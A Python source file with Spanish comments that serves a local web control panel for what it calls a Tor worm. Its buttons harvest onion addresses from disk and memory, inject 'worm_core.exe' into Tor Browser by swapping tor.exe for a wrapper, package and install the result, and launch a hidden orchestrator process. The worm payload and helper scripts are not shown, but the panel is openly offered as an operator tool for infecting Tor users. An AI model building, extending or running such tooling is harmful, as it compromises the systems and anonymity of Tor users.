# extractor_gui.py — Interfaz visual con barra de progreso y anti-bloqueo
import os
import sys
import json
import subprocess
import threading
import time
import webbrowser
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

HERE = os.path.dirname(os.path.abspath(__file__))
os.chdir(HERE)

STATE = {
    "tor_root": "",
    "log": [],
    "running": False,
    "progress": 0,
    "task_name": ""
}

def read_tor_path():
    try:
        with open("tor_path.txt", "r") as f:
            return f.read().strip()
    except:
        return ""

def write_tor_path(p):
    with open("tor_path.txt", "w") as f:
        f.write(p)

def log(msg):
    STATE["log"].append(f"[{time.strftime('%H:%M:%S')}] {msg}")
    if len(STATE["log"]) > 500:
        STATE["log"] = STATE["log"][-500:]

def set_progress(val, task=""):
    STATE["progress"] = val
    STATE["task_name"] = task

def run_cmd_async(cmd, timeout=600):
    """Ejecuta comandos capturando la salida en tiempo real."""
    log(f"$ {cmd}")
    try:
        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
            text=True, errors="replace", cwd=HERE
        )
        # Leer la salida en tiempo real
        for line in iter(process.stdout.readline, ''):
            clean_line = line.strip()
            if clean_line:
                log(f"  {clean_line}")
                
        process.stdout.close()
        process.wait(timeout=timeout)
        
        if process.returncode != 0:
            log(f"[!] El comando falló con código {process.returncode}")
            return False
        return True
    except subprocess.TimeoutExpired:
        log(f"[!] Timeout de {timeout}s alcanzado.")
        process.kill()
        return False
    except Exception as e:
        log(f"[!] Excepción ejecutando comando: {str(e)}")
        return False

def action_locate():
    run_cmd_async('python -c "from tor_locator import find_tor_install; p=find_tor_install(); open(\'tor_path.txt\',\'w\').write(p or \'\'); print(p or \'NO ENCONTRADO\')"')
    STATE["tor_root"] = read_tor_path()
    if STATE["tor_root"]:
        log(f"[+] TOR detectado en: {STATE['tor_root']}")
    else:
        log("[!] TOR no encontrado.")

def action_harvest():
    if not STATE["tor_root"]:
        log("[!] Primero localiza TOR")
        return
    run_cmd_async(f'python onion_harvester.py "{STATE["tor_root"]}"')

def action_deep():
    if not STATE["tor_root"]:
        log("[!] Primero localiza TOR")
        return
    if not os.path.exists("deep_harvester.py"):
        log("[!] Falta deep_harvester.py")
        return
    run_cmd_async(f'python deep_harvester.py "{STATE["tor_root"]}"')

def action_live():
    if not os.path.exists("onion_comm.py"):
        log("[!] Falta onion_comm.py")
        return
    # Asegurarse de tener las dependencias para curl y requests
    run_cmd_async(f'python onion_comm.py')

def action_inject():
    if not STATE["tor_root"]:
        log("[!] Primero localiza TOR")
        return
    run_cmd_async(f'python tor_injector.py "{STATE["tor_root"]}" worm_core.exe')

def action_package():
    if not STATE["tor_root"]:
        log("[!] Primero localiza TOR")
        return
    run_cmd_async(f'python packager.py "{STATE["tor_root"]}" worm_core.exe tor_worm_pkg.zip')

def action_install():
    if not STATE["tor_root"]:
        log("[!] Primero localiza TOR")
        return
    run_cmd_async(f'install.bat "{STATE["tor_root"]}"')

def action_uninstall():
    if not STATE["tor_root"]:
        log("[!] Primero localiza TOR")
        return
    tdir = os.path.join(STATE["tor_root"], "Browser", "TorBrowser", "Tor")
    tor_bin = os.path.join(tdir, "tor.exe")
    tor_real = os.path.join(tdir, "tor_real.exe")
    
    if os.path.exists(tor_real):
        try:
            import shutil
            shutil.copy2(tor_real, tor_bin)
            worm_file = os.path.join(tdir, "worm_core.exe")
            if os.path.exists(worm_file):
                os.remove(worm_file)
            log("[+] Wrapper eliminado. TOR original restaurado.")
        except Exception as e:
            log(f"[!] Error al restaurar: {e}")
    else:
        log("[!] No se encontró tor_real.exe. Nada que restaurar.")

def action_run():
    log("[*] Lanzando orchestrator en segundo plano...")
    try:
        if os.path.exists("orchestrator.exe"):
            subprocess.Popen(["orchestrator.exe"], creationflags=0x08000000, cwd=HERE)
        elif os.path.exists("orchestrator.py"):
            subprocess.Popen(["python", "orchestrator.py"], creationflags=0x08000000, cwd=HERE)
        else:
            log("[!] No existe orchestrator.py.")
            return
        log("[+] Orchestrator lanzado oculto.")
    except Exception as e:
        log(f"[!] Error al lanzar: {e}")

def action_bootstrap():
    """Prepara el entorno: dependencias, compilación, etc."""
    log("[*] Verificando entorno Python...")
    set_progress(10, "Instalando dependencias")
    run_cmd_async("python -m pip install --upgrade requests pysocks wmi")
    set_progress(30, "Verificando TOR")
    action_locate()
    set_progress(50, "Compilando binarios (si g++ está presente)")
    if os.path.exists("build.bat"):
        run_cmd_async("build.bat")
    set_progress(100, "Bootstrap completo")

def async_worker(func, *args):
    def wrapper():
        STATE["running"] = True
        set_progress(0, "Iniciando...")
        try:
            func(*args)
        finally:
            STATE["running"] = False
            set_progress(100, "Listo")
    threading.Thread(target=wrapper, daemon=True).start()
    handlers = {
                    "bootstrap": action_bootstrap,
                    "locate": action_locate, "harvest": action_harvest, 
                    "deep": action_deep, "live": action_live,
                    "inject": action_inject, "package": action_package, 
                    "install": action_install, "uninstall": action_uninstall,
                    "run": action_run, "recompile": lambda: run_cmd_async("build.bat"),
                    "unlock": lambda: (STATE.update({"running": False, "progress": 0, "task_name": "Desbloqueado por el usuario"}), log("[!] Estado de ejecución reiniciado a la fuerza."))[1]
                }

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Extractor TOR - Breadcrumb</title>
<style>
  * { box-sizing: border-box; }
  body { background: #0a0e14; color: #b8c4d0; font-family: 'Consolas', monospace; margin: 0; padding: 20px; }
  h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; letter-spacing: 2px; }
  .container { max-width: 1200px; margin: 0 auto; }
  
  .progress-container { margin: 20px 0; background: #000; border: 1px solid #333; border-radius: 4px; overflow: hidden; position: relative; height: 30px; }
  .progress-bar { background: #00ff88; height: 100%; width: 0%; transition: width 0.3s ease; }
  .progress-text { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: bold; text-shadow: 1px 1px 2px #000; font-size: 14px; }
  
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; margin: 20px 0; }
  button { background: #0d1117; border: 1px solid #00ff88; color: #00ff88; padding: 15px; font-family: inherit; font-size: 14px; cursor: pointer; transition: all 0.2s; text-align: left; }
  button:hover:not(:disabled) { background: #00ff88; color: #0a0e14; box-shadow: 0 0 20px rgba(0,255,136,0.5); }
  button:disabled { opacity: 0.4; cursor: not-allowed; }
  
  .log { background: #000; border: 1px solid #333; padding: 15px; height: 400px; overflow-y: auto; font-size: 12px; line-height: 1.6; white-space: pre-wrap; color: #00ff88; }
  .status { display: flex; gap: 20px; margin: 10px 0; font-size: 13px; }
  .status span { padding: 4px 10px; border: 1px solid #333; background: #0d1117; }
  .status span.ok { border-color: #00ff88; color: #00ff88; }
  .status span.no { border-color: #ff3355; color: #ff3355; }
  
  .input-group { margin: 15px 0; display: flex; gap: 10px; }
  .input-group input { flex: 1; background: #0d1117; border: 1px solid #333; color: #b8c4d0; padding: 10px; font-family: inherit; }
  .input-group button { padding: 10px 20px; }
  h2 { color: #00ff88; margin-top: 30px; font-size: 16px; letter-spacing: 1px; }
</style>
</head>
<body>
<div class="container">
  <h1>EXTRACTOR TOR — BREADCRUMB</h1>
  
  <div class="progress-container">
    <div class="progress-bar" id="progress-bar"></div>
    <div class="progress-text" id="progress-text">Esperando...</div>
  </div>

  <div class="status">
    <span id="tor-status" class="no">TOR: sin localizar</span>
    <span id="comp-status" class="no">Binarios: sin compilar</span>
  </div>

  <h2>0. INICIALIZACIÓN</h2>
  <div class="grid">
    <button onclick="act('bootstrap')">Ejecutar Bootstrap Completo</button>
  </div>

  <h2>1. LOCALIZACIÓN</h2>
  <div class="input-group">
    <input type="text" id="tor-path" placeholder="Ruta de TOR Browser">
    <button onclick="act('locate')">Detectar TOR</button>
    <button onclick="savePath()">Guardar Ruta</button>
  </div>

  <h2>2. RECOLECCIÓN</h2>
  <div class="grid">
    <button onclick="act('harvest')">Recolectar onions estático</button>
    <button onclick="act('deep')">Extracción PROFUNDA (memoria + NTFS)</button>
    <button onclick="act('live')">Extraer ONIONS VIVOS (TOR activo)</button>
  </div>

  <h2>3. INYECCIÓN Y EMPAQUETADO</h2>
  <div class="grid">
    <button onclick="act('inject')">Inyectar gusano en TOR</button>
    <button onclick="act('package')">Empaquetar ZIP</button>
    <button onclick="act('install')">Instalar en TOR</button>
    <button onclick="act('uninstall')">Desinstalar wrapper</button>
  </div>

   <h2>4. EJECUCIÓN Y CONTROL</h2>
  <div class="grid">
    <button onclick="act('run')">Lanzar orchestrator (oculto)</button>
    <button onclick="act('recompile')">Recompilar binarios</button>
    <button onclick="act('unlock')" style="border-color: #ff3355; color: #ff3355;">Forzar Desbloqueo</button>
  </div>

  <h2>LOG DE ESTADO</h2>
  <div class="log" id="log">Esperando acciones...</div>
</div>

<script>
let pollInterval;

async function act(action) {
  const logDiv = document.getElementById('log');
  logDiv.textContent += `\n>>> Iniciando: ${action}...\n`;
  logDiv.scrollTop = logDiv.scrollHeight;
  
  try {
    await fetch('/action?name=' + action);
    startPolling();
  } catch(e) {
    logDiv.textContent += `\n[ERROR JS] ${e}`;
  }
}

function startPolling() {
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(updateStatus, 500); // Consulta cada 500ms
  updateStatus();
}

async function savePath() {
  const p = document.getElementById('tor-path').value;
  await fetch('/save_path?path=' + encodeURIComponent(p));
  updateStatus();
}

async function updateStatus() {
  try {
    const r = await fetch('/status');
    const s = await r.json();
    
    // Actualizar barra de progreso
    const bar = document.getElementById('progress-bar');
    const txt = document.getElementById('progress-text');
    bar.style.width = s.progress + '%';
    txt.textContent = s.task_name || (s.running ? 'Procesando...' : 'Listo');
    
    // Estado TOR
    const torEl = document.getElementById('tor-status');
    torEl.textContent = s.tor_root ? 'TOR: ' + s.tor_root.split('\\').pop() : 'TOR: sin localizar';
    torEl.className = s.tor_root ? 'ok' : 'no';
    if (s.tor_root) document.getElementById('tor-path').value = s.tor_root;
    
    // Estado binarios
    const compEl = document.getElementById('comp-status');
    compEl.textContent = 'Binarios: ' + (s.binaries ? 'OK' : 'faltan');
    compEl.className = s.binaries ? 'ok' : 'no';
    
    // Actualizar log
    const logDiv = document.getElementById('log');
    const isScrolledToBottom = logDiv.scrollHeight - logDiv.clientHeight <= logDiv.scrollTop + 50;
    logDiv.textContent = s.log || 'Esperando...';
    if (isScrolledToBottom) logDiv.scrollTop = logDiv.scrollHeight;
    
    // Si terminó, detener polling
    if (!s.running && pollInterval) {
      clearInterval(pollInterval);
      pollInterval = null;
    }
  } catch(e) {}
}
updateStatus();
</script>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode())
            return
        if path == "/status":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            data = {
                "tor_root": STATE["tor_root"], 
                "binaries": os.path.exists("worm_core.exe") and os.path.exists("tor_wrapper.exe"),
                "running": STATE["running"],
                "progress": STATE["progress"],
                "task_name": STATE["task_name"],
                "log": "\n".join(STATE["log"])
            }
            self.wfile.write(json.dumps(data).encode())
            return
        if path == "/action":
            qs = parse_qs(parsed.query)
            name = qs.get("name", [""])[0]
            
            # Si ya hay uno corriendo, no dejamos lanzar otro
            if STATE["running"]:
                log("[!] Ya hay una tarea en ejecución. Espera a que termine.")
            else:
                STATE["log"] = [] # Limpiar log
                handlers = {
                    "bootstrap": action_bootstrap,
                    "locate": action_locate, "harvest": action_harvest, 
                    "deep": action_deep, "live": action_live,
                    "inject": action_inject, "package": action_package, 
                    "install": action_install, "uninstall": action_uninstall,
                    "run": action_run, "recompile": lambda: run_cmd_async("build.bat"),
                }
                fn = handlers.get(name)
                if fn:
                    # Lanzar en hilo separado para no bloquear
                    async_worker(fn)
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"ok": True}).encode())
            return
        if path == "/save_path":
            qs = parse_qs(parsed.query)
            p = qs.get("path", [""])[0]
            if p:
                write_tor_path(p)
                STATE["tor_root"] = p
            self.send_response(200)
            self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

def main():
    STATE["tor_root"] = read_tor_path()
    server = ThreadingHTTPServer(("127.0.0.1", 8080), Handler)
    print("[*] Interfaz en http://localhost:8080")
    threading.Timer(1.5, lambda: webbrowser.open("http://localhost:8080")).start()
    try: server.serve_forever()
    except KeyboardInterrupt: print("\n[*] cerrando")

if __name__ == "__main__":
    main()